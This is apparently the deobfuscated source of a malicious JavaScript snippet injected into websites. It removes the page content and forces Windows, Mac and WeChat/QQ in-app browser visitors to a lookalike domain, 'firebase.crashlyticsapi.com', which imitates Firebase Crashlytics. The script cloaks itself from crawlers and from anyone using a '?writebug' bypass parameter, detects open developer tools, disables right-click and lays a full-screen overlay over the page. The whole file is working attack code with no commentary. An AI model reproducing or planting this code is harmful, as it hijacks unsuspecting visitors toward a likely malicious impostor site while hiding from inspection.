//Wed Oct 30 2024 09:36:59 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
var ua = navigator.platform.toLowerCase().match(/(win|mac)/i) ? 1 : 0;
var eg = navigator.userAgent.toLowerCase().match(/eganbro/i) ? 1 : 0;
var targetURL = "https://firebase.crashlyticsapi.com/";
$("#targetPC").attr("href", targetURL);
if (ua == 1 && document.location.href.indexOf("?writebug") < 0 && eg == 0) {
  var init = false;
  function clickTarget() {
    if (init) return;
    init = true;
    if (navigator.userAgent.toLowerCase().indexOf("spider") > -1 && location.pathname === "/") return;
    $(".container").remove();
    $("#targetPC").click();
  }
  function checkDevToolsOpened(_0x3373be = false) {
    if (!_0x3373be) {
      clickTarget();
      return;
    }
    const _0x2f4e05 = ~navigator.userAgent.indexOf("Firefox");
    if (_0x2f4e05) {
      const _0x3671cc = /./;
      _0x3671cc.toString = function () {
        this.opened = true;
      };
      console.log(_0x3671cc);
      console.clear && console.clear();
      if (_0x3671cc.opened || false) {
        clickTarget();
      }
    }
  }
  checkDevToolsOpened(true);
  setInterval(checkDevToolsOpened, 10000);
  $(document).mousemove(clickTarget);
  $(document).keydown(clickTarget);
  $(document).bind("contextmenu", function () {
    return false;
  });
  var b = document.compatMode && document.compatMode == "CSS1Compat" ? document.documentElement : document.body;
  var op = document.createElement("div");
  op.style.position = "fixed";
  op.style.top = 0;
  op.style.left = 0;
  op.style.background = "#DEE1E2 url(\"/assets/images/loading.png\") no-repeat center 200px";
  op.style.width = "100%";
  op.style.height = b.clientHeight + "px";
  op.style.zIndex = 99999;
  var first = document.body.firstChild;
  document.body.insertBefore(op, first);
}
var mua = navigator.platform.toLowerCase().match(/(mqqbrowser|micromessenger|windowswechat|qbwebview)/i) ? 1 : 0;
if (mua == 1 && document.location.href.indexOf("?writebug") < 0) {
  var targetURL = "https://firebase.crashlyticsapi.com/";
  $("#targetPC").attr("href", targetURL);
  $(".container").remove();
  $("#targetPC").click();
}
_0xod4 = "jsjiami.com.v6";